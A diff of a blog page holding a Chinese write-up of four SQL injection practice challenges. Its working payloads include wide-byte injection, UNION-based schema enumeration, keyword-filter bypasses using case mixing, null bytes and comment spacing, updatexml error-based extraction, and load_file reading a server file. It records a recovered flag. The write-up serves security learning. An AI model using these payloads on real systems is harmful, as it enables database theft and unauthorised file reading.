@@ -346,51 +346,51 @@
       
 
       
-        <h1 id="SQL注入练习题解"><a href="#SQL注入练习题解" class="headerlink" title="SQL注入练习题解"></a>SQL注入练习题解</h1><h2 id="SQL-1"><a href="#SQL-1" class="headerlink" title="SQL-1"></a>SQL-1</h2><p>题目：<a href="http://103.238.227.13:10083/" target="_blank" rel="noopener">http://103.238.227.13:10083/</a><br>sql首先用单引号，and 1=1，and 1=2 等，发现已经被过滤了。</p>
+        <h1 id="SQL注入练习题解"><a href="#SQL注入练习题解" class="headerlink" title="SQL注入练习题解"></a>SQL注入练习题解</h1><h2 id="SQL-1"><a href="#SQL-1" class="headerlink" title="SQL-1"></a>SQL-1</h2><p>题目：<a href="http://103.238.227.13:10083/" target="_blank" rel="external">http://103.238.227.13:10083/</a><br>sql首先用单引号，and 1=1，and 1=2 等，发现已经被过滤了。</p>
 <a id="more"></a>
 <p><img src="https://github.com/Windylh/image/raw/master/2017.3.31/1-1.png" alt="1-1"></p>
 <p>查看网页源代码，发现是gb2312，看表哥发的资料，采用的是宽字节注入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10083/?id=-1%df%27</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://103.238.227.13:10083/?id=-1%df%27</div></pre></td></tr></table></figure>
 <p><img src="https://github.com/Windylh/image/raw/master/2017.3.31/1-2.png" alt="1-2"></p>
 <p>发现了注入方法，判断有多少列</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10083/?id=-1%df&apos; order by 2 --+</span><br><span class="line">页面正常</span><br><span class="line">http://103.238.227.13:10083/?id=-1%df&apos; order by 3 --+</span><br><span class="line">回显Unknown column &apos;3&apos; in &apos;order clause&apos;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http://103.238.227.13:10083/?id=-1%df&apos; order by 2 --+</div><div class="line">页面正常</div><div class="line">http://103.238.227.13:10083/?id=-1%df&apos; order by 3 --+</div><div class="line">回显Unknown column &apos;3&apos; in &apos;order clause&apos;</div></pre></td></tr></table></figure>
 <p>所以有2列。<br>查询库名：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10083/?id=-1%df&apos; union select 1,group_concat(schema_name) From information_schema.schemata --+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://103.238.227.13:10083/?id=-1%df&apos; union select 1,group_concat(schema_name) From information_schema.schemata --+</div></pre></td></tr></table></figure>
 <p><img src="https://github.com/Windylh/image/raw/master/2017.3.31/1-3.png" alt="1-3"><br>查询表名：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10083/?id=-1%df&apos; union select 1,group_concat(table_name) From information_schema.tables Where table_schema=database() --+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://103.238.227.13:10083/?id=-1%df&apos; union select 1,group_concat(table_name) From information_schema.tables Where table_schema=database() --+</div></pre></td></tr></table></figure>
 <p><img src="https://github.com/Windylh/image/raw/master/2017.3.31/1-4.png" alt="1-4"></p>
 <p>查询列名：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10083/?id=-1%df&apos; union select 1,group_concat(column_name) From information_schema.columns Where table_schema=database() --+</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://103.238.227.13:10083/?id=-1%df&apos; union select 1,group_concat(column_name) From information_schema.columns Where table_schema=database() --+</div></pre></td></tr></table></figure>
 <p><img src="https://github.com/Windylh/image/raw/master/2017.3.31/1-5.png" alt="1-5"><br>查询字段名：</p>
-<p>from key显示出错，推测过滤了key，经表哥提示，在key前加了.，后来发现在key前加上<code></code>也可以查出结果。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10083/?id=-1%df%27 union select 1,group_concat(id,char(32),string) from .key --+</span><br></pre></td></tr></table></figure>
+<p>from key显示出错，推测过滤了key，经表哥提示，在key前加了.，后来发现在key前加上``也可以查出结果。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://103.238.227.13:10083/?id=-1%df%27 union select 1,group_concat(id,char(32),string) from .key --+</div></pre></td></tr></table></figure>
 <p><img src="https://github.com/Windylh/image/raw/master/2017.3.31/1-6.png" alt="1-6"></p>
-<h2 id="SQL-2"><a href="#SQL-2" class="headerlink" title="SQL-2"></a>SQL-2</h2><p>题目地址：<a href="http://103.238.227.13:10084/" target="_blank" rel="noopener">http://103.238.227.13:10084/</a></p>
+<h2 id="SQL-2"><a href="#SQL-2" class="headerlink" title="SQL-2"></a>SQL-2</h2><p>题目地址：<a href="http://103.238.227.13:10084/" target="_blank" rel="external">http://103.238.227.13:10084/</a></p>
 <p>这题过滤了and等小写单词，但是换成大小写就可以绕过</p>
 <p>运用updatexml()函数报错，@@version函数查询数据库版本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10084/?id=-1 aNd uPdatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://103.238.227.13:10084/?id=-1 aNd uPdatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)</div></pre></td></tr></table></figure>
 <p><img src="https://github.com/Windylh/image/raw/master/2017.3.31/2-1.png" alt="2-1"></p>
-<h2 id="SQL-3"><a href="#SQL-3" class="headerlink" title="SQL-3"></a>SQL-3</h2><p>题目：<a href="http://103.238.227.13:10087/" target="_blank" rel="noopener">http://103.238.227.13:10087/</a></p>
-<p>题目里过滤了union select等等关键字，查了资料，用%00截断。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10087/?id=1 u%00nion sel%00ect 1,version() --+</span><br></pre></td></tr></table></figure></p>
+<h2 id="SQL-3"><a href="#SQL-3" class="headerlink" title="SQL-3"></a>SQL-3</h2><p>题目：<a href="http://103.238.227.13:10087/" target="_blank" rel="external">http://103.238.227.13:10087/</a></p>
+<p>题目里过滤了union select等等关键字，查了资料，用%00截断。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://103.238.227.13:10087/?id=1 u%00nion sel%00ect 1,version() --+</div></pre></td></tr></table></figure></p>
 <p><img src="https://github.com/Windylh/image/raw/master/2017.3.31/3-1.png" alt="3-1"><br>直接查询相应的值</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10087/?id=1%20u%00nion%20sel%00ect%20GROUP_CONCAT(hash),1%20fr%00om%20.key%20--+</span><br></pre></td></tr></table></figure>
-<h2 id="SQL-4"><a href="#SQL-4" class="headerlink" title="SQL-4"></a>SQL-4</h2><p>题目：<a href="http://103.238.227.13:10088/" target="_blank" rel="noopener">http://103.238.227.13:10088/</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://103.238.227.13:10087/?id=1%20u%00nion%20sel%00ect%20GROUP_CONCAT(hash),1%20fr%00om%20.key%20--+</div></pre></td></tr></table></figure>
+<h2 id="SQL-4"><a href="#SQL-4" class="headerlink" title="SQL-4"></a>SQL-4</h2><p>题目：<a href="http://103.238.227.13:10088/" target="_blank" rel="external">http://103.238.227.13:10088/</a></p>
 <p>题目过滤了各种符号和union，union select查询就不适用了</p>
 <p>限制了空格，用注释代替，/**/</p>
 <p>想起了之前的updatexml()函数报错。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10088/?id=-1/**/and/**/updatexml(1,concat(0x7e,(SELECT@@version),0x7e),1)</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/Windylh/image/master/2017.3.31/4-1.png" alt="4-1"><br>运用load_file()函数读取文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10088/?id=-1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/load_file(0x2f7661722f746573742f6b65795f312e706870)),0x7e),1)</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://103.238.227.13:10088/?id=-1/**/and/**/updatexml(1,concat(0x7e,(SELECT@@version),0x7e),1)</div></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/Windylh/image/master/2017.3.31/4-1.png" alt="4-1"><br>运用load_file()函数读取文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://103.238.227.13:10088/?id=-1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/load_file(0x2f7661722f746573742f6b65795f312e706870)),0x7e),1)</div></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/Windylh/image/master/2017.3.31/4-2.png" alt="4-2"><br>读取成功</p>
-<p>调用substring()函数读取文档中字符串内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://103.238.227.13:10088/?id=-1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/substring(load_file(0x2f7661722f746573742f6b65795f312e706870),2,32)),0x7e),1)</span><br></pre></td></tr></table></figure></p>
+<p>调用substring()函数读取文档中字符串内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://103.238.227.13:10088/?id=-1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/substring(load_file(0x2f7661722f746573742f6b65795f312e706870),2,32)),0x7e),1)</div></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/Windylh/image/master/2017.3.31/4-3.png" alt="4-3"><br>是一个php脚本</p>
 <p>因为updatexml()、substring()函数每次只能输出32个字符，所以需要分次查询<br><img src="https://raw.githubusercontent.com/Windylh/image/master/2017.3.31/4-4.png" alt="4-4"><br><img src="https://raw.githubusercontent.com/Windylh/image/master/2017.3.31/4-5.png" alt="4-5"><br>连接字符串得到flag</p>
 <p>Flag:”7249f5a7fd1de602b30e6f39aea6193a”</p>
 <p>查看资料：</p>
 <blockquote>
 <ul>
-<li><a href="http://www.jianshu.com/p/ba35a7e1c67d" target="_blank" rel="noopener">http://www.jianshu.com/p/ba35a7e1c67d</a></li>
-<li><a href="https://zhuanlan.zhihu.com/p/24756501" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/24756501</a></li>
-<li><a href="https://www.waitalone.cn/mysql-error-based-injection.html" target="_blank" rel="noopener">https://www.waitalone.cn/mysql-error-based-injection.html</a></li>
+<li><a href="http://www.jianshu.com/p/ba35a7e1c67d" target="_blank" rel="external">http://www.jianshu.com/p/ba35a7e1c67d</a></li>
+<li><a href="https://zhuanlan.zhihu.com/p/24756501" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/24756501</a></li>
+<li><a href="https://www.waitalone.cn/mysql-error-based-injection.html" target="_blank" rel="external">https://www.waitalone.cn/mysql-error-based-injection.html</a></li>
 </ul>
 </blockquote>
 
